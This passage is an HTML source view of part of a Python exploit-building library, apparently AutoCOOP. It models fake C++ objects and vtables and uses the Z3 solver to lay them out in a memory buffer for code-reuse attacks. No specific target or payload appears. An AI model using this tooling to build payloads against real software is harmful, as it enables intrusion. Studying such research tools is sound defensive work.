+<div class="viewcode-block" id="Memory.itRegions"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.itRegions">[docs]</a>    <span class="k">def</span> <span class="nf">itRegions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">dataOnly</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+        <span class="n">offsets</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="n">offsets</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="n">offsets</span><span class="p">:</span>
+            <span class="n">region</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
+            <span class="k">if</span> <span class="n">dataOnly</span> <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="k">continue</span>
+            <span class="k">yield</span> <span class="n">region</span></div>
+
+<div class="viewcode-block" id="Memory.itPointers"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.itPointers">[docs]</a>    <span class="k">def</span> <span class="nf">itPointers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">offsets</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="n">offsets</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="n">offsets</span><span class="p">:</span>
+            <span class="n">region</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
+            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">region</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">Pointer</span><span class="p">):</span> <span class="k">yield</span> <span class="n">region</span></div>
+
+<div class="viewcode-block" id="Memory.resolvePointers"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.resolvePointers">[docs]</a>    <span class="k">def</span> <span class="nf">resolvePointers</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">lblOffsets</span><span class="p">,</span> <span class="n">relocator</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Resolves all pointers. </span>
+<span class="sd">        @param lblOffsets Dictionary containing offsets of labels.</span>
+<span class="sd">        @param relocator Relocator for offsets of labels.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itPointers</span><span class="p">():</span>
+            <span class="k">assert</span> <span class="n">p</span><span class="o">.</span><span class="n">targetLabel</span> <span class="ow">in</span> <span class="n">lblOffsets</span>
+            <span class="n">labelOffset</span> <span class="o">=</span> <span class="n">lblOffsets</span><span class="p">[</span><span class="n">p</span><span class="o">.</span><span class="n">targetLabel</span><span class="p">]</span>
+            <span class="n">targetAddr</span> <span class="o">=</span> <span class="n">relocator</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="n">labelOffset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">targetOffset</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">setData</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">packNativeInt</span><span class="p">(</span><span class="n">targetAddr</span><span class="p">))</span></div></div>
+
+<div class="viewcode-block" id="Object"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Object">[docs]</a><span class="k">class</span> <span class="nc">Object</span><span class="p">:</span>
+    <span class="sd">&quot;&quot;&quot; Describes a fake object that consists at least of a vptr. &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">vIndex</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="n">vFunc</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="o">.</span><span class="n">X64</span><span class="p">,</span> <span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">fixedOffset</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        @param vIndex [deprecated] the vtable index of the virtual function to call</span>
+<span class="sd">        @param vFunc [deprecated] the address of the virtual function to call</span>
+<span class="sd">        @param noFakeVtable [False is deprecated] if true, no false vtable is created</span>
+<span class="sd">        @param fixedOffset if set, the object is guaranteed to reside at the given address</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">arch</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">fixedOffset</span> <span class="o">=</span> <span class="n">fixedOffset</span>
+        <span class="c1"># create memory map</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span> <span class="o">=</span> <span class="n">Memory</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">arch</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">noFakeVtable</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># reserve region for vptr at offset 0.</span>
+            <span class="c1"># self.mem.addData(0, arch.packNativeInt(0xDEADBEEF))</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">Vtable</span><span class="p">(</span><span class="n">arch</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">vIndex</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">vFunc</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="k">assert</span> <span class="bp">self</span><span class="o">.</span><span class="n">vtable</span><span class="o">.</span><span class="n">addEntry</span><span class="p">(</span><span class="n">vIndex</span><span class="p">,</span> <span class="n">vFunc</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">False</span>
+
+<div class="viewcode-block" id="Object.setVptr"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Object.setVptr">[docs]</a>    <span class="k">def</span> <span class="nf">setVptr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ptrPtrVfunc</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Sets the vptr of the object.</span>
+<span class="sd">        @param ptrPtrVfunc pointer to pointer to vfunc of interest</span>
+<span class="sd">        @param index [optional] the index the vfunc should have in the vftable</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">vptr</span> <span class="o">=</span> <span class="n">ptrPtrVfunc</span> <span class="o">-</span> <span class="n">index</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">vptr</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Object.setLabel"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Object.setLabel">[docs]</a>    <span class="k">def</span> <span class="nf">setLabel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">label</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Sets a label to the object if not one is already present.</span>
+<span class="sd">        Returns the effective label.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="mi">0</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">regions</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">label</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">label</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">label</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">label</span> <span class="o">=</span> <span class="n">label</span>
+            <span class="k">return</span> <span class="n">label</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">label</span></div></div>
+
+<div class="viewcode-block" id="Obj32"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Obj32">[docs]</a><span class="k">class</span> <span class="nc">Obj32</span><span class="p">(</span><span class="n">Object</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Convenience wrapper, same as Object but has arch=Arch.X86 and noFakeVtable=True fixed. &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fixedOffset</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="n">Object</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="o">.</span><span class="n">X86</span><span class="p">,</span> <span class="n">fixedOffset</span><span class="o">=</span><span class="n">fixedOffset</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Obj64"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Obj64">[docs]</a><span class="k">class</span> <span class="nc">Obj64</span><span class="p">(</span><span class="n">Object</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Convenience wrapper, same as Object but has arch=Arch.X64 and noFakeVtable=True fixed. &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fixedOffset</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="n">Object</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="o">.</span><span class="n">X64</span><span class="p">,</span> <span class="n">fixedOffset</span><span class="o">=</span><span class="n">fixedOffset</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Vtable"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Vtable">[docs]</a><span class="k">class</span> <span class="nc">Vtable</span><span class="p">:</span>
+    <span class="sd">&quot;&quot;&quot; Describes a fake vtable. &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="o">.</span><span class="n">X64</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">entries</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">arch</span>
+
+    <span class="c1">## Adds an entry to the object&#39;s vtable.</span>
+<div class="viewcode-block" id="Vtable.addEntry"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Vtable.addEntry">[docs]</a>    <span class="k">def</span> <span class="nf">addEntry</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">sanitize</span> <span class="o">=</span> <span class="kc">True</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">sanitize</span> <span class="ow">and</span> <span class="n">index</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">entries</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">entries</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">func</span>
+
+        <span class="k">return</span> <span class="kc">True</span></div>
+
+<div class="viewcode-block" id="Vtable.getBuffer"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Vtable.getBuffer">[docs]</a>    <span class="k">def</span> <span class="nf">getBuffer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fillChar</span><span class="o">=</span><span class="s1">&#39;$&#39;</span><span class="p">):</span>
+        <span class="n">indeces</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">entries</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="n">indeces</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+
+        <span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="n">nextIndex</span> <span class="o">=</span> <span class="mi">0</span>
+
+        <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="n">indeces</span><span class="p">:</span>
+            <span class="n">buffer</span> <span class="o">+=</span> <span class="n">fillChar</span> <span class="o">*</span> <span class="p">((</span><span class="n">index</span> <span class="o">-</span> <span class="n">nextIndex</span><span class="p">)</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span><span class="p">)</span>
+            <span class="n">buffer</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">packNativeInt</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">entries</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
+            <span class="n">nextIndex</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>
+
+        <span class="k">return</span> <span class="n">buffer</span></div>
+
+<div class="viewcode-block" id="Vtable.getSize"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Vtable.getSize">[docs]</a>    <span class="k">def</span> <span class="nf">getSize</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">indeces</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">entries</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">indeces</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="mi">0</span>
+        <span class="n">indeces</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">indeces</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span></div></div>
+
+<div class="viewcode-block" id="ExpUnsat"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.ExpUnsat">[docs]</a><span class="k">class</span> <span class="nc">ExpUnsat</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s2">&quot;Constraints on memory model are unsatisfiable.&quot;</span></div>
+
+<div class="viewcode-block" id="BaseBuilder"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.BaseBuilder">[docs]</a><span class="k">class</span> <span class="nc">BaseBuilder</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="o">.</span><span class="n">X64</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Constructor.</span>
+<span class="sd">        @param baseBuff Base address of the buffer.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">objects</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">baseBuff</span> <span class="o">=</span> <span class="n">baseBuff</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">arch</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">lblOffsets</span> <span class="o">=</span> <span class="kc">None</span>
+
+<div class="viewcode-block" id="BaseBuilder.addObj"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.BaseBuilder.addObj">[docs]</a>    <span class="k">def</span> <span class="nf">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Add object; returns the objects id &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span></div>
+
+<div class="viewcode-block" id="BaseBuilder.itObjects"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.BaseBuilder.itObjects">[docs]</a>    <span class="k">def</span> <span class="nf">itObjects</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">objId</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="p">)):</span>
+            <span class="n">obj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="p">[</span><span class="n">objId</span><span class="p">]</span>
+            <span class="k">yield</span> <span class="p">(</span><span class="n">objId</span><span class="p">,</span> <span class="n">obj</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="BaseBuilder.getLastObjectId"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.BaseBuilder.getLastObjectId">[docs]</a>    <span class="k">def</span> <span class="nf">getLastObjectId</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Returns the id of the very last object in line. &quot;&quot;&quot;</span>
+        <span class="n">lastObjId</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+        <span class="k">assert</span> <span class="n">lastObjId</span> <span class="o">&gt;=</span> <span class="mi">0</span>
+        <span class="k">return</span> <span class="n">lastObjId</span></div>
+
+    <span class="k">def</span> <span class="nf">_getOffsetsObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Returns a list of offsets at which an object can be found. &quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
+        <span class="k">return</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span><span class="p">[</span><span class="n">objId</span><span class="p">]</span> <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">_obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">()</span> <span class="k">if</span> <span class="n">_obj</span> <span class="o">==</span> <span class="n">obj</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">_calcOffsets</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">maxOffset</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Calculates the global offset for each object and label using Z3.</span>
+<span class="sd">        Offsets are accessible via the dictionaries self.objOffsets and self.lblOffsets afterwards.</span>
+<span class="sd">        @param maxOffset The maximum usable offset.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="kn">import</span> <span class="nn">z3</span>
+        <span class="n">BASE_ID_LABELS</span> <span class="o">=</span> <span class="mi">1000</span>
+
+        <span class="c1"># create solver</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">Solver</span><span class="p">()</span>
+        <span class="c1"># create array representing the entire memory range</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">Array</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">z3</span><span class="o">.</span><span class="n">IntSort</span><span class="p">(),</span> <span class="n">z3</span><span class="o">.</span><span class="n">IntSort</span><span class="p">())</span>
+
+        <span class="n">zObjOffsets</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">zLblOffsets</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+            <span class="n">zObjOffset</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">Int</span><span class="p">(</span><span class="s2">&quot;O</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">objId</span><span class="p">)</span>
+            <span class="n">zObjOffsets</span><span class="p">[</span><span class="n">objId</span><span class="p">]</span> <span class="o">=</span> <span class="n">zObjOffset</span>
+            <span class="sd">&quot;&quot;&quot; Add general constraints for object.</span>
+<span class="sd">            &lt;global offset object&gt; &gt;= 0</span>
+<span class="sd">            &lt;global offset object&gt; + &lt;max offset object&gt; &lt;= &lt;global max offset&gt;</span>
+<span class="sd">            &quot;&quot;&quot;</span>
+            <span class="c1"># does this object need to reside at a fixed offset?</span>
+            <span class="k">if</span> <span class="n">obj</span><span class="o">.</span><span class="n">fixedOffset</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="c1"># if so, add corresponding constraint</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">zObjOffset</span> <span class="o">==</span> <span class="n">obj</span><span class="o">.</span><span class="n">fixedOffset</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="c1"># if not, just make sure it does not get negative</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">zObjOffset</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="c1"># add constraint regarding the maxOffset</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">zObjOffset</span> <span class="o">+</span> <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">getMaxOffset</span><span class="p">())</span> <span class="o">&lt;=</span> <span class="n">maxOffset</span><span class="p">)</span>
+
+            <span class="c1"># iterate over all the object&#39;s regions</span>
+            <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
+                <span class="c1"># each region gets the id corresponding to its parent object.</span>
+                <span class="n">regionId</span> <span class="o">=</span> <span class="n">objId</span>
+                <span class="k">if</span> <span class="n">region</span><span class="o">.</span><span class="n">label</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                    <span class="c1"># each labeled region gets its unique global id.</span>
+                    <span class="n">regionId</span> <span class="o">=</span> <span class="n">BASE_ID_LABELS</span> <span class="o">+</span> <span class="n">region</span><span class="o">.</span><span class="n">label</span>
+                    <span class="c1"># check if we already created an z3 variable for this label&#39;s offset.</span>
+                    <span class="k">if</span> <span class="n">region</span><span class="o">.</span><span class="n">label</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">zLblOffsets</span><span class="p">:</span>
+                        <span class="n">temp</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">Int</span><span class="p">(</span><span class="s2">&quot;L</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">region</span><span class="o">.</span><span class="n">label</span><span class="p">)</span>
+                        <span class="n">zLblOffsets</span><span class="p">[</span><span class="n">region</span><span class="o">.</span><span class="n">label</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span>
+                        <span class="sd">&quot;&quot;&quot; Add general constraint for label:</span>
+<span class="sd">                        &lt;global offset label&gt; &gt;= 0</span>
+<span class="sd">                        &quot;&quot;&quot;</span>
+                        <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">temp</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+
+                    <span class="c1"># get z3 index for this label&#39;s offset</span>
+                    <span class="n">zLabel</span> <span class="o">=</span> <span class="n">zLblOffsets</span><span class="p">[</span><span class="n">region</span><span class="o">.</span><span class="n">label</span><span class="p">]</span>
+                    <span class="sd">&quot;&quot;&quot; Add constraint for label for this region:</span>
+<span class="sd">                    &lt;global offset object&gt; + &lt;relative offset region&gt; = &lt;global offset label&gt;</span>
+<span class="sd">                    &quot;&quot;&quot;</span>
+                    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">zObjOffset</span> <span class="o">+</span> <span class="n">region</span><span class="o">.</span><span class="n">offset</span><span class="p">)</span> <span class="o">==</span> <span class="n">zLabel</span><span class="p">)</span>
+
+                <span class="sd">&quot;&quot;&quot; Add constraints for each byte in the region to ensure that regions do not overlap:</span>
+<span class="sd">                A[&lt;global offset byte&gt;] == &lt;id region&gt;</span>
+<span class="sd">                &quot;&quot;&quot;</span>
+                <span class="k">for</span> <span class="n">byteOffset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">region</span><span class="o">.</span><span class="n">offset</span><span class="p">,</span> <span class="n">region</span><span class="o">.</span><span class="n">offset</span> <span class="o">+</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span><span class="p">):</span>
+                    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">z3</span><span class="o">.</span><span class="n">Select</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="p">(</span><span class="n">zObjOffset</span> <span class="o">+</span> <span class="n">byteOffset</span><span class="p">))</span> <span class="o">==</span> <span class="n">regionId</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span><span class="o">.</span><span class="n">r</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">ExpUnsat</span><span class="p">()</span>
+
+        <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
+        <span class="c1"># create offset dictionaries.</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span> <span class="o">=</span> <span class="p">{</span><span class="n">objId</span> <span class="p">:</span> <span class="n">m</span><span class="p">[</span><span class="n">zObjOffsets</span><span class="p">[</span><span class="n">objId</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">objId</span> <span class="ow">in</span> <span class="n">zObjOffsets</span><span class="p">}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">lblOffsets</span> <span class="o">=</span> <span class="p">{</span><span class="n">label</span> <span class="p">:</span> <span class="n">m</span><span class="p">[</span><span class="n">zLblOffsets</span><span class="p">[</span><span class="n">label</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">zLblOffsets</span><span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">_createObjBuffer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">objReloc</span><span class="o">=</span><span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)):</span>
+        <span class="sd">&quot;&quot;&quot; Creates buffer containing all fake objects. Not exlpoit-specific.</span>
+<span class="sd">        Needs to be invoked after _calcOffsets().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">assert</span> <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
